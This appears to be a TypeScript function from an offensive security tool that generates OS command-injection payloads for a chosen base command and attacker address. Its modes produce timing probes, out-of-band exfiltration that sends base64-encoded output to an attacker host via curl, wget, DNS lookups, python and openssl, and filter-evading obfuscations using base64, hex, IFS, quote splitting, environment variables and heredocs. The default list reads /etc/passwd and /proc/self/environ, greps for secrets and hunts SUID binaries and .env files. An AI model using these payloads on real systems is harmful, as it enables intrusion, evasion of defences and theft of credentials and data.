export function generateSuggestions(
  mode: string | undefined,
  baseCmd = "id",
  attackerIp = "127.0.0.1",
  attackerPort = "4444",
): string[] {
  const b = (baseCmd || "id").trim();
  const b64 = Buffer.from(b).toString("base64");
  const rawHex = Buffer.from(b).toString("hex");
  const hex = Array.from(Buffer.from(b)).map(x => `\\x${x.toString(16).padStart(2, "0")}`).join("");
  const TAB = "\t";
  const IFS = "${IFS}";

  switch (mode) {
    case "blind":
      return [
        `${b} && sleep 7`,
        `${b}||(sleep 9)`,
        `${b}; _t=$SECONDS; sleep 6; echo $((SECONDS-_t))`,
        `${b} & sleep 5 && wait`,
        `${b} && bash -c 'read -t 8 x'`,
        `${b}; ping -c 7 -i 1 127.0.0.1 >/dev/null`,
        `${b} && python3 -c "import time;time.sleep(8)"`,
        `${b} && perl -e "sleep 9"`,
        `{ ${b}; } && sleep 6 || sleep 6`,
        `${b}; for i in 1 2 3 4 5 6 7; do sleep 1; done`,
      ];

    case "oob":
      return [
        `${b} && curl -sk "http://${attackerIp}:${attackerPort}/?x=$(${b}|base64 -w0)"`,
        `${b} && nslookup "$(${b}|head -c20|tr -cd '[:alnum:]').${attackerIp}"`,
        `${b} && wget -qO- "http://${attackerIp}:${attackerPort}/?d=$(${b}|base64 -w0)"`,
        `${b} && curl -sk -X POST "http://${attackerIp}:${attackerPort}/" -d "$(${b})"`,
        `${b} | curl -sk -T- "http://${attackerIp}:${attackerPort}/upload"`,
        `${b} && dig +short "$(${b}|head -c20|tr -cd '[:alnum:]').ns.${attackerIp}"`,
        `${b} | python3 -c "import sys,urllib.request;urllib.request.urlopen('http://${attackerIp}:${attackerPort}/?x='+__import__('base64').b64encode(sys.stdin.buffer.read()).decode())"`,
        `${b} | openssl s_client -connect ${attackerIp}:${attackerPort} -quiet 2>/dev/null`,
      ];

    case "quantum": {
      const b64full = Buffer.from(`${b} && uname -a && id`).toString("base64");
      const b64env = Buffer.from(`${b} && env`).toString("base64");
      return [
        `{echo,${b64}}|{base64,-d}|bash`,
        `bash<<<$(echo${TAB}${b64}|base64${TAB}-d)`,
        `eval "$(printf '${hex}')"`,
        `{echo,${b64full}}|{base64,-d}|{bash,}`,
        `$(printf '${hex}') && uname -a`,
        `python3 -c "import base64,os;os.system(base64.b64decode('${b64}').decode())"`,
        `perl -e "system(pack('H*','${rawHex}'))"`,
        `ruby -e "require 'base64';system(Base64.decode64('${b64}'))"`,
        `node -e "require('child_process').execSync(Buffer.from('${b64}','base64').toString(),{stdio:'inherit'})"`,
        `_x=$(echo ${b64env}|base64 -d);eval${TAB}$_x`,
      ];
    }

    case "ifs":
      return [
        `${b.replace(/ /g, IFS)}`,
        `cat${IFS}/etc/passwd`,
        `id;${IFS}uname${IFS}-a`,
        `bash${IFS}-c${IFS}${JSON.stringify(b)}`,
        `{ IFS=,; set -- ${b.replace(/ /g, ",")}; "$@"; }`,
        `${b.replace(/ /g, "\t")}`,
        `env${IFS}PATH=/bin${IFS}${b.replace(/ /g, IFS)}`,
        `eval${IFS}$(echo${IFS}${b64}|base64${IFS}-d)`,
      ];

    case "concat":
      return [
        `c'a't${IFS}/etc/passwd`,
        `id;who'a'mi`,
        `ca""t${IFS}/etc/shadow`,
        `ec""ho${IFS}test`,
        `/bin/c'a't${IFS}/etc/pa'ss'wd`,
        `${b.replace(/([a-z])([a-z])/g, "$1''$2")}`,
        `w'h'o'a'm'i`,
        `${b.replace(/([a-z]{2})([a-z])/g, (_, a, c) => a + '"' + c)}`,
      ];

    case "hex":
      return [
        `eval "$(printf '${hex}')"`,
        `perl -e "system(pack('H*','${rawHex}'))"`,
        `python3 -c "import os;os.system(bytes.fromhex('${rawHex}').decode())"`,
        `node -e "require('child_process').execSync(Buffer.from('${rawHex}','hex').toString(),{stdio:'inherit'})"`,
        `$(printf '${hex}')`,
        `{ _NX="$(printf '${hex}')"; eval "$_NX"; }`,
        `echo ${rawHex}|xxd -r -p|bash`,
        `ruby -e "system([${Array.from(Buffer.from(b)).map(x => x.toString()).join(",")}].pack('C*'))"`,
      ];

    case "b64loop": {
      const b64x2 = Buffer.from(b64).toString("base64");
      return [
        `bash<<<$(echo${TAB}${b64}|base64${TAB}-d)`,
        `{echo,${b64}}|{base64,-d}|{bash,}`,
        `{ _a="${b64x2}"; _b=$(echo "$_a"|base64 -d|base64 -d); bash<<<$_b; }`,
        `perl -MMIME::Base64 -e "system(decode_base64('${b64}'))"`,
        `python3 -c "import base64,os;os.system(base64.b64decode('${b64}').decode())"`,
        `ruby -e "require 'base64';system(Base64.decode64('${b64}'))"`,
        `node -e "require('child_process').execSync(Buffer.from('${b64}','base64').toString(),{stdio:'inherit'})"`,
        `echo ${b64}|base64 -d|bash`,
      ];
    }

    case "env":
      return [
        `_NX=${JSON.stringify(b)};eval $_NX`,
        `export _CMD=${JSON.stringify(b)}; bash -c "$_CMD"`,
        `_A=${JSON.stringify(b.split(" ")[0] ?? b)}; _B=${JSON.stringify(b.split(" ").slice(1).join(" "))}; $_A $_B`,
        `declare _NX=${JSON.stringify(b)}; eval "$_NX"`,
        `printf -v _NX '%s' ${JSON.stringify(b)}; eval "$_NX"`,
        `read _NX <<< ${JSON.stringify(b)}; bash -c "$_NX"`,
        `_C=bash; _X=${JSON.stringify(b)}; $_C -c "$_X"`,
        `env _NX=${JSON.stringify(b)} bash -c 'eval $_NX'`,
      ];

    case "heredoc": {
      const mk = `NXHD${Math.floor(Math.random() * 9000) + 1000}`;
      return [
        `bash<<'${mk}'\n${b}\n${mk}`,
        `bash<<${mk}\n${b}\n${mk}`,
        `sh<<'NXEOF'\n${b}\nNXEOF`,
        `python3 <<'PYEOF'\nimport os\nos.system(${JSON.stringify(b)})\nPYEOF`,
        `perl <<'PLEOF'\nsystem(${JSON.stringify(b)});\nPLEOF`,
        `ruby <<'RBEOF'\nsystem(${JSON.stringify(b)})\nRBEOF`,
        `bash -c $(cat <<'EOF'\n${b}\nEOF\n)`,
        `eval $(cat <<'EX'\n${b}\nEX\n)`,
      ];
    }

    default:
      return [
        `${b} && id && uname -a && hostname`,
        `${b}; cat /etc/passwd`,
        `${b}; ls -la /`,
        `${b} && env | grep -iE 'pass|key|secret|token|api'`,
        `${b} && find / -perm -4000 -type f 2>/dev/null | head -10`,
        `${b} && cat /proc/self/environ | tr '\\0' '\\n'`,
        `${b} && ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null`,
        `${b} && nc -zv ${attackerIp} ${attackerPort} 2>&1`,
        `${b} && cat /proc/version; lsb_release -a 2>/dev/null`,
        `${b} && df -h; free -m; uptime`,
        `${b} && ls -la /home; ls -la /root 2>/dev/null`,
        `${b} && find / -name "*.env" -o -name "*.config" -o -name "config.php" 2>/dev/null | head -8`,
      ];
  }
}
